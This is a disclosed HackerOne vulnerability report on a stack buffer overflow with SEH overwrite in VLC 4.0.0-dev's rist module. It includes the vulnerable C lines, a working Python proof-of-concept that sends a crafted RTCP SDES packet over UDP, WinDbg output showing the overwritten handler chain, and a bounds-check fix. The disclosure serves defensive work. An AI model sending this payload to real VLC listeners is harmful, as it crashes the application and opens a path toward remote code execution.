# VLC 4.0.0 - Stack Buffer Overflow (SEH)

## Report Details
- **Report ID**: 489102
- **URL**: https://hackerone.com/reports/489102
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-01-31T14:06:58.630Z
- **Disclosed**: 2020-02-10T20:54:07.452Z

## Reporter
- **Username**: qrayn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vlc_h1c

## Vulnerability Information
**Summary:**

Incorrect calculation of Buffer Size in rist module for VLC leading to Stack Overflow with SEH chain overwrite.

The modules/access/rist module has an incorrect calculation of buffer size giving an attacker the possibility to set the buffer size of a local variable by sending a maliciously crafted RTSP packet and overflowing the variable in a proceeding memcpy operation. 

**Description:**

In the static void rtcp_input(...) function a variable new_sender_name is defined with a maximum size of MAX_CNAME (128 bytes). When reading a RTCP_PT_SDES package the length for the memcpy operation is set by the rtcp_sdes_get_name_length(buf) which is taking the 9-10th bit of the buffer and making it possible to change the amount of bytes read into the new_sender_name variable.

_rtcp_input(...) (modules/access/rist.c)_
```
/** Sender name is set to max length of MAX_CNAME (128), line: 446 **/
char new_sender_name[MAX_CNAME];

/** name_length is read from the RTSP header, line: 489 **/
int8_t name_length = rtcp_sdes_get_name_length(buf);

/** memcpy new_sender_name with name_length bytes, line: 525 **/
memcpy(new_sender_name, buf + RTCP_SDES_SIZE, name_length);
```

For this to be exploitable the user has to first actively setup a rist listener using VLC.

## Steps To Reproduce:

  1. Open VLC and bind rist on local port: vlc.exe rist://0.0.0.0:8888
  2. Edit IP and port configuration in vlc.py
  3. Execute PoC: ./vlc.py

## Supporting Material/References:

### Proof of Concept

```
#!/usr/bin/python
import socket

server = ("192.168.0.23", 8889)
udp = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

bufsize = "\x80" # Amounts of bytes we want read into new_sender_name (128 bytes)

buf = "\x80"                  # Version and padding
buf += "\xCA"                 # packet type = RTCP_PT_SDES
buf += "\x00\x00"             # Record length
buf += "\x00\x00\x00\x00\x00" # SDES record
buf += bufsize                # Buffer size of name 9-10 bit

# 64 bit
buf += "A" * 232 + "B" * 8 + "C" * 8 + "D" * 200 # Buffer for new_sender_name

# 32 bit
#buf += "A" * 568 + "B" * 4 + "C" * 4 + "D" * 50 # Buffer for new_sender_name

udp.sendto(buf, server)
```

### SEH chain overwrite

0:019> !exchain
100 stack frames, scanning for handlers...
Frame 0x01: error getting module for 4242424242424242
Frame 0x02: error getting module for 4343434343434343
Frame 0x03: error getting module for 4444444444444444

0:019> !exchain
3411ff68: 43434343
Invalid exception stack at 42424242

## Suggested mitigation

Extended bounds checking on line 490 would mitigate this problem.

Replacing the following code on line 490:
```
if (name_length > bytes_left)
```

With an extended bounds check:
```
if (name_length > bytes_left || name_length >= MAX_CNAME)
```

## Impact

## Impact
High implication buffer overflow causing application crash and SEH record overwrite. Explotation plausible depending on system and security setup.

Successful exploitation could lead to remote code execution and full system compromise.

If the user is using rist this vulnerability would be able to execute remotely.

## Affected versions
The code seems to have been introduced in a commit on 5th of November 2018 to the 4.0.0-dev branch. Earlier versions seems unaffected by this vulnerability.

## Attachments
No attachments
